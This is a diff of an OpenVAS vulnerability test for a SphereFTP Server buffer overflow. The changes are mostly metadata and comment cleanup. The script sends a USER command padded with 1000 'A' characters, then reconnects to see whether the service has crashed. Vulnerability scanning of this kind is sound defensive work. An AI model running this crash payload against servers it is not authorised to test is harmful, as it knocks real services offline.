@@ -1,6 +1,6 @@
 ###############################################################################
 # OpenVAS Vulnerability Test
-# $Id: gb_sphere_ftp_server_bof_vuln.nasl 5867 2017-04-05 09:01:13Z teissa $
+# $Id: gb_sphere_ftp_server_bof_vuln.nasl 11516 2018-09-21 11:15:17Z asteins $
 #
 # SphereFTP Server Buffer Overflow vulnerability
 #
@@ -29,10 +29,10 @@ CPE = "cpe:/a:menasoft:sphereftpserver";
 if (description)
 {
   script_oid("1.3.6.1.4.1.25623.1.0.807534");
-  script_version("$Revision: 5867 $");
+  script_version("$Revision: 11516 $");
   script_tag(name:"cvss_base", value:"5.0");
   script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:N/I:N/A:P");
-  script_tag(name:"last_modification", value:"$Date: 2017-04-05 11:01:13 +0200 (Wed, 05 Apr 2017) $");
+  script_tag(name:"last_modification", value:"$Date: 2018-09-21 13:15:17 +0200 (Fri, 21 Sep 2018) $");
   script_tag(name:"creation_date", value:"2016-04-04 16:23:30 +0530 (Mon, 04 Apr 2016)");
   script_name("SphereFTP Server Buffer Overflow vulnerability");
 
@@ -47,20 +47,20 @@ if (description)
 
   script_tag(name:"impact", value:"Successful exploitation will allow a remote
   attacker to cause denial of service condition resulting in loss of availability
-  for the application.
-
-  Impact Level: Application.");
+  for the application.");
 
   script_tag(name:"affected", value:"SphereFTP Server v2.0, Other versions may
   also be affected.");
 
-  script_tag(name:"solution", value:"No solution or patch was made available for at least one year since disclosure of this vulnerability. Likely none will be provided anymore. General solution options are to upgrade to a newer release, disable respective features, remove the product or replace the product by another one.");
+  script_tag(name:"solution", value:"No known solution was made available for at least one year since the disclosure
+  of this vulnerability. Likely none will be provided anymore. General solution options are to upgrade to a newer
+  release, disable respective features, remove the product or replace the product by another one.");
 
   script_tag(name:"solution_type", value:"WillNotFix");
 
   script_tag(name:"qod_type", value:"remote_app");
 
-  script_xref(name : "URL" , value : "http://www.exploit-db.com/exploits/38072");
+  script_xref(name:"URL", value:"http://www.exploit-db.com/exploits/38072");
 
   script_category(ACT_DENIAL);
   script_copyright("Copyright (C) 2016 Greenbone Networks GmbH");
@@ -72,39 +72,23 @@ if (description)
 }
 
 
-##
-## The script code starts here
-##
-
 include("ftp_func.inc");
 include("host_details.inc");
 
-## Variable Initialization
-ftplogin = "";
-ftpPort = "";
-banner = "";
-user = "";
-pass = "";
-soc = "";
-
-## Get HTTP Port
 if(!ftpPort = get_app_port(cpe:CPE)){
   exit(0);
 }
 
-## Get Username from KB, If not given use default Username
 user = get_kb_item("ftp/login");
 if(!user){
   user = "anonymous";
 }
 
-## Get Password from KB, If not given use default Password
 pass = get_kb_item("ftp/password");
 if(!pass){
   pass = "anonymous";
 }
 
-## Open the socket
 soc = open_sock_tcp(ftpPort);
 if(!soc) exit(0);
 
@@ -116,16 +100,13 @@ if(!ftplogin)
   exit(0);
 }
 
-## Construct the crafted request
 PAYLOAD = crap(data: "A", length:1000);
 
 ## Send specially crafted USER command
 send(socket:soc, data:string("USER", PAYLOAD, '\r\n'));
 
-## Close FTP Socket
 ftp_close(socket:soc);
 
-## Confirm the Exploit by opening socket
 soc = open_sock_tcp(ftpPort);
 if(!soc)
 {
@@ -133,7 +114,6 @@ if(!soc)
   exit(0);
 }
 
-## Confirm the Exploit by login
 ftplogin = ftp_log_in(socket:soc, user:user, pass:pass);
 if(!ftplogin)
 {
